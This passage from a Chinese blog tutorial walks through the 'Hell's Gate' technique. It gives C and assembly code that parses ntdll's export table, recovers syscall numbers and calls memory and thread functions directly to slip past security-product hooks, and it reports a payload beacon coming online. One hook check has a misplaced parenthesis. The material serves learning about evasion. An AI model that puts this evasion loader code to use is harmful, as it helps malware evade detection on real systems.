(PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink - 0x10);</span></span><br><span class="line">	PBYTE ImageBase;</span><br><span class="line">	PIMAGE_NT_HEADERS Nt = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_DOS_HEADER Dos = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER File = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER Optional = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY ExportTable = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//读取模块 x64位 gs寄存器0x60偏移  x86 fs寄存器0x30</span></span><br><span class="line">	PPEB Peb = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">	<span class="comment">//读取进程中内存载入的第二个模块 ntdll.dll</span></span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLoadModule;</span><br><span class="line">	pLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - <span class="number">0x10</span>);</span><br><span class="line">	<span class="comment">//printf(&quot;Module Name:%ws\r\nModule BaseAddress:%p\r\n&quot;, pLoadModule-&gt;FullDllName.Buffer, pLoadModule-&gt;DllBase);</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//将模块的基地址作为ImageBase</span></span><br><span class="line">	ImageBase = (PBYTE)pLoadModule-&gt;DllBase;</span><br><span class="line">	Dos = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">	<span class="comment">//判断是否为正常PE头</span></span><br><span class="line">	<span class="keyword">if</span> (Dos-&gt;e_magic != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Pe Header Error %d\r\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Dos-&gt;lfanew指出相对于ImageBase IMAGE_NT_HEADERS的偏移  基地址+偏移量拿到IMAGE_NT_HEADERS的地址</span></span><br><span class="line">	Nt = (PIMAGE_NT_HEADERS)((PBYTE)ImageBase + Dos-&gt;e_lfanew);</span><br><span class="line">	<span class="comment">//与Nt类似，Pe头结构中再加上Signature所占大小得到标准pe头位置</span></span><br><span class="line">	File = (PIMAGE_FILE_HEADER)((PBYTE)ImageBase + (Dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD)));</span><br><span class="line">	<span class="comment">//标准头地址+标准头的大小得到扩展头位置</span></span><br><span class="line">	Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)File + <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_FILE_HEADER));</span><br><span class="line">	<span class="comment">//根据DataDirectory结构很轻松的能拿到导出地址表的VirtualAddress</span></span><br><span class="line">	ExportTable = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ImageBase + Optional-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此处我们获得导出表(EAT)的方法是:</p>
+<ul>
+<li>IMAGE_DOS_HEADER：利用ImageBase基址转化而成。</li>
+<li>IMAGE_NT_HEADER：利用Dos头地址 + Dos头成员e_lfanew处的偏移量得到。</li>
+<li>IMAGE_FILE_HEADER：根据PE文件头的结构可知，File头的起始地址可利用Dos部首基址 + e_lfanew成员的偏移量 + 一个DWORD的大小推出。</li>
+<li>IMAGE_OPTIONAL_HEADER：File头基址 + File头大小便是扩展PE头的地址。</li>
+</ul>
+<p>根据这个逻辑，我们可以在扩展头的DataDirectory中，拿到导出表的所在地址。</p>
+<p>对导出表中的函数进行遍历，我们可以通过：</p>
+<ol>
+<li>FunctionNameAddressArray 一个包含函数名称的数组</li>
+<li>FunctionOrdinalAddressArray  充当函数寻址数组的索引</li>
+<li>FunctionAddressArray 一个包含函数地址的数组</li>
+</ol>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;winternl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//pLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink - 0x10);</span></span><br><span class="line">	<span class="comment">//pFirstLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink - 0x10);</span></span><br><span class="line">	PBYTE ImageBase;</span><br><span class="line">	PIMAGE_NT_HEADERS Nt = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_DOS_HEADER Dos = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER File = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER Optional = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY ExportTable = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	PPEB Peb = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLoadModule;</span><br><span class="line">	pLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - <span class="number">0x10</span>);</span><br><span class="line">		<span class="comment">//输出当前模块名</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Module Name:%ws\r\nModule Address:%p&quot;</span>, pLoadModule-&gt;FullDllName.Buffer, pLoadModule-&gt;DllBase);</span><br><span class="line">    </span><br><span class="line">	ImageBase = (PBYTE)pLoadModule-&gt;DllBase;</span><br><span class="line">	Dos = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">	<span class="comment">//判断是否为正常PE头</span></span><br><span class="line">	<span class="keyword">if</span> (Dos-&gt;e_magic != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Pe Header Error %d\r\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Dos-&gt;lfanew指出相对于ImageBase IMAGE_NT_HEADERS的偏移  基地址+偏移量拿到IMAGE_NT_HEADERS的地址</span></span><br><span class="line">	Nt = (PIMAGE_NT_HEADERS)((PBYTE)ImageBase + Dos-&gt;e_lfanew);</span><br><span class="line">	<span class="comment">//与Nt类似，Pe头结构中再加上Signature所占大小得到标准pe头位置</span></span><br><span class="line">	File = (PIMAGE_FILE_HEADER)((PBYTE)ImageBase + (Dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD)));</span><br><span class="line">	<span class="comment">//标准头地址+标准头的大小得到扩展头位置</span></span><br><span class="line">	Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)File + <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_FILE_HEADER));</span><br><span class="line">	<span class="comment">//根据DataDirectory结构很轻松的能拿到导出地址表的VirtualAddress</span></span><br><span class="line">	ExportTable = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ImageBase + Optional-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//导出函数地址表</span></span><br><span class="line">	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)(ImageBase + ExportTable-&gt;AddressOfFunctions));</span><br><span class="line">	<span class="comment">//导出函数名称表</span></span><br><span class="line">    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)(ImageBase + ExportTable-&gt;AddressOfNames));</span><br><span class="line">	<span class="comment">//导出函数名称序号表</span></span><br><span class="line">    PWORD pdwAddressOfNameOrdinales = (PWORD)((PBYTE)ImageBase + ExportTable-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (WORD i = <span class="number">0</span>; i &lt; ExportTable-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">		PCHAR pFunctionName = (PCHAR)((PBYTE)ImageBase + pdwAddressOfNames[i]);</span><br><span class="line">		PVOID pFunctionAddress = (PBYTE)ImageBase + pdwAddressOfFunctions[pdwAddressOfNameOrdinales[i]];</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Function Name:%s\r\nFunction Address:%p\r\n&quot;</span>, pFunctionName, pFunctionAddress);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功读取ntdll.dll中的导出函数表</p>
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220807161115532.png" alt="image-20220807161115532"></p>
+<h3 id="3-地狱之门"><a href="#3-地狱之门" class="headerlink" title="3.地狱之门"></a>3.地狱之门</h3><p>搞了这么久，终于开始我们的正片，地狱之门的学习。</p>
+<h5 id="3-1-什么是地狱之门？"><a href="#3-1-什么是地狱之门？" class="headerlink" title="3.1 什么是地狱之门？"></a>3.1 什么是地狱之门？</h5><p>利用windbg进行调试，可以看到未被HOOK的NTDLL的函数对应的汇编代码</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uf ntdll!NtOpenProcess</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220807171136927.png" alt="image-20220807171136927"></p>
+<p>NTDLL再进入Ring0执行函数内核部分前将会验证当前的线程执行环境是x64还是x86，通过对<code>ShareUserData+0x308</code>的后续测试也说明了这点。在进行判断是否执行函数前都会给eax寄存器一个系统调用号并且该调用号不同版本的Windows是不一样的，如果确定执行环境是基于x64则会通过<code>syscall</code>执行系统调用，否则会执行函数返回。</p>
+<p>利用Windbg查询系统调用号:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db (ntdll!ntopenprocess + <span class="number">0</span>x4 ) L <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220905181709362.png" alt="image-20220905181709362"></p>
+<p>此处利用db按字节来查看<code>ntdll模块</code>中的<code>NtOpenProcess函数</code>信息，查询是以<code>NtOpenProcess函数</code>作为基地址，偏移4个字节查询得到对应函数的系统调用号。</p>
+<p>在线查询系统调用号：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://j00ru.vexillium.org/syscalls/nt/<span class="number">64</span>/</span><br></pre></td></tr></table></figure>
+
+<p>这边放上crispr师傅做出的被hook过的NTDLL汇编图</p>
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220807172258575.png" alt="image-20220807172258575"></p>
+<p>很显然，在<code>ZwMapViewOfSection</code>上，原来的<code>mov r10,rcx</code>已经被修改为了<code>jmp xxxxx</code>进行地址跳转，而在<code>ZwSetInformationFile</code>以及其他函数处还是未被hook过的，系统调用号分别为0x27、0x29</p>
+<p>系统调用被定义为WORD类型（16位无符号整数），并存储在EAX寄存器中，并且实际上我们是能够动态获得系统调用号的,以<code>NtOpenProcess</code>为例:</p>
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220807173014055.png" alt="image-20220807173014055"> </p>
+<p>这就是地狱之门的原理，直接读取进程的第二个导入模块，也就是NtDLL,解析结构然后遍历导出表，根据函数哈希找到函数地址，将这个函数读取出来后通过<code>0xb8</code>操作码动态获取对应的系统调用号，从而绕过内存监控，在自己程序中执行了NTDLL的导出函数而不是直接<code>LoadLibrary</code>然后<code>GetProcAddress</code>做IAT隐藏</p>
+<h5 id="3-2-代码实现"><a href="#3-2-代码实现" class="headerlink" title="3.2 代码实现"></a>3.2 代码实现</h5><p>我们在进行操作时，需要定义一个与syscall相关联的数据结构:<code>_VX_TABLE_ENTRY</code>事实上每一个系统调用都需要分配一个这样的结构，用于校验导出表内导出的函数是否为我们所需，存储导出表函数的地址，存储系统调用号，结构定义如下所示</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">VX_TABLE_ENTRY</span> &#123;</span></span><br><span class="line"> PVOID pAddress;</span><br><span class="line"> DWORD64 dwHash;</span><br><span class="line"> WORD wSystemCall;</span><br><span class="line">&#125; VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>
+
+<p>其中包括指向模块的指针，一个函数hash，用于查找内存中指定函数（此处是利用djb2算法进行加密），一个<code>WORD</code>类型的系统调用号<code>wSystemCall</code>。</p>
+<p>同时，我们还需要定义一个更大的结构用于包括项目中所需的每一个系统调用的函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">VX_TABLE</span> &#123;</span></span><br><span class="line"> VX_TABLE_ENTRY NtAllocateVirtualMemory;</span><br><span class="line"> VX_TABLE_ENTRY NtProtectVirtualMemory;</span><br><span class="line"> VX_TABLE_ENTRY NtCreateThreadEx;</span><br><span class="line"> VX_TABLE_ENTRY NtWaitForSingleObject;</span><br><span class="line">&#125; VX_TABLE, * PVX_TABLE;</span><br></pre></td></tr></table></figure>
+
+<p>接下來便是使用PEB的相关结构来动态获取系统调用号和函数地址来填充刚刚定义好的数据结构，用于实现自定义系统调用，绕过EAT表限制，HellsGate作者是通过TEB获取PEB数据结构，从而拿到NTDLL模块基地址实现的操作。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PTEB <span class="title">RtlGetThreadEnvironmentBlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _WIN64</span></span><br><span class="line">	<span class="keyword">return</span> (PTEB)__readgsqword(<span class="number">0x30</span>); <span class="comment">//x64位在GS寄存器的0x30偏移处可以拿到TEB结构</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> (PTEB)__readfsqword(<span class="number">0x18</span>); <span class="comment">//x86位在FS寄存器的0x18偏移处可以拿到TEB结构</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();</span><br><span class="line">PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;</span><br><span class="line"><span class="comment">//判断Teb、Peb是否正常取得，同时判断当前操作系统是否为Win10</span></span><br><span class="line"><span class="keyword">if</span> (!pCurrentTeb || !pCurrentPeb || pCurrentPeb-&gt;OSMajorVersion != <span class="number">0xA</span>) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Windows Version Error&quot;</span>, GetLastError());</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当我们拿到Peb后，接下来便是需要拿到导出表结构</p>
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220911150704197.png" alt="image-20220911150704197"></p>
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220911150726510.png" alt="image-20220911150726510"></p>
+<p>取得导出表后，我们需要循环遍历导出表内的导出函数名称与地址，根据djb2算法加密函数名称拿到指定的导出函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//利用djb2算法提前加密好dwhash，等待后续与后期导出表函数名称进行对比查找指定函数</span></span><br><span class="line">VX_TABLE Table = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">Table.NtAllocateVirtualMemory.dwHash = <span class="number">0xf5bd373480a6b89b</span>;</span><br><span class="line"><span class="keyword">if</span> (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtAllocateVirtualMemory)) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Get NtAllocateVirtualMemory syscall error &quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Table.NtCreateThreadEx.dwHash = <span class="number">0x64dc7db288c5015f</span>;</span><br><span class="line"><span class="keyword">if</span> (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtCreateThreadEx)) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Get NtCreateThreadEx syscall error &quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Table.NtProtectVirtualMemory.dwHash = <span class="number">0x858bcb1046fb6a37</span>;</span><br><span class="line"><span class="keyword">if</span> (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtProtectVirtualMemory)) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Get NtProtectVirtualMemory syscall error &quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Table.NtWaitForSingleObject.dwHash = <span class="number">0xc6a2fa174e551bcb</span>;</span><br><span class="line"><span class="keyword">if</span> (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtWaitForSingleObject)) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Get NtWaitForSingleObject syscall error &quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>HellsGate中，最关键的一个函数GetVxTableEntry，在这里我们将遍历模块内的导出函数用以查找指定函数，并判断模块中的导出函数是否被hook，以及取得函数系统调用号、函数地址、dwHash获得PVX_TABLE_ENTRY的完整结构，下一步，便是通过汇编代码模拟正常系统调用过程进行调用函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetVxTableEntry</span><span class="params">(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry)</span> </span>&#123;</span><br><span class="line">	PDWORD pWzAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">	PDWORD pWzAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNames);</span><br><span class="line">	PWORD pWzAddressOfOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (WORD i = <span class="number">0</span>; i &lt; pImageExportDirectory-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">		PCHAR pWzAddressOfName = (PCHAR)((PBYTE)pModuleBase + pWzAddressOfNames[i]);</span><br><span class="line">		PVOID pWzAddressOfFunction = (PBYTE)pModuleBase + pWzAddressOfFunctions[pWzAddressOfOrdinales[i]];</span><br><span class="line"></span><br><span class="line">		<span class="comment">//验证func hash是否一致</span></span><br><span class="line">		<span class="keyword">if</span> (djb2(pWzAddressOfName) == pVxTableEntry-&gt;dwHash) &#123;</span><br><span class="line">			pVxTableEntry-&gt;pAddress = pWzAddressOfFunction;</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">		WORD wz = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">			<span class="keyword">if</span> (*((PBYTE)pWzAddressOfFunction + wz) == <span class="number">0x4c</span> &amp;&amp;</span><br><span class="line">				*((PBYTE)pWzAddressOfFunction + wz + <span class="number">0x01</span>) == <span class="number">0x8b</span> &amp;&amp;</span><br><span class="line">				*((PBYTE)pWzAddressOfFunction + wz + <span class="number">0x02</span>) == <span class="number">0xd1</span> &amp;&amp;</span><br><span class="line">				*((PBYTE)pWzAddressOfFunction + wz + <span class="number">0x03</span>) == <span class="number">0xb8</span> &amp;&amp;</span><br><span class="line">				*((PBYTE)pWzAddressOfFunction + wz + <span class="number">0x06</span>) == <span class="number">0x00</span> &amp;&amp;</span><br><span class="line">				*((PBYTE)pWzAddressOfFunction + wz + <span class="number">0x07</span>) == <span class="number">0x00</span>) &#123;</span><br><span class="line"></span><br><span class="line">				BYTE Low = *((PBYTE)pWzAddressOfFunction + wz + <span class="number">4</span>);</span><br><span class="line">				BYTE High = *((PBYTE)pWzAddressOfFunction + wz + <span class="number">5</span>);</span><br><span class="line">				<span class="comment">//大小端转换拿到syscall number</span></span><br><span class="line">				pVxTableEntry-&gt;wSystemCall = (High &lt;&lt; <span class="number">8</span>) | Low;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//判断偏移地址离所需的syscall number是否太远</span></span><br><span class="line">			<span class="keyword">if</span> (*((PBYTE)pVxTableEntry-&gt;pAddress + wz) == <span class="number">0xc3</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;The function is far away from syscall number&quot;</span>);</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (*((PBYTE)pVxTableEntry-&gt;pAddress + wz) == <span class="number">0x0f</span> &amp;&amp; *(PBYTE)pVxTableEntry-&gt;pAddress + wz + <span class="number">1</span> == <span class="number">0x05</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;check if ret, in this case we are also probaly too far&quot;</span>);</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">			&#125;</span><br><span class="line">			wz++;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>另起一个asm文件，用于保存我们的汇编代码,此处我们模拟原生函数的系统调用过程，在HellsGate定义的子程序中我们为wSystemCall赋值，HellDescent中我们将拿到的系统调用号传给eax寄存器，模仿正常系统调用过程，完成系统调用操作Nt函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> wSystemCall DWORD 0h</span><br><span class="line">.code</span><br><span class="line"> HellsGate PROC</span><br><span class="line"> mov wSystemCall, 0h</span><br><span class="line"> mov wSystemCall, ecx</span><br><span class="line"> ret</span><br><span class="line"> HellsGate ENDP</span><br><span class="line"> HellDescent PROC</span><br><span class="line"> mov r10, rcx</span><br><span class="line"> mov eax, wSystemCall</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br><span class="line"> HellDescent ENDP</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+<p>调用<code>HellsGate、HellDescent</code>，拿到对应的Nt函数进行执行Payload进行上线。</p>
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220911153238164.png" alt="image-20220911153238164"></p>
+<p>成功上线</p>
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220911153607207.png" alt="image-20220911153607207"></p>
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220911153703485.png" alt="image-20220911153703485"></p>
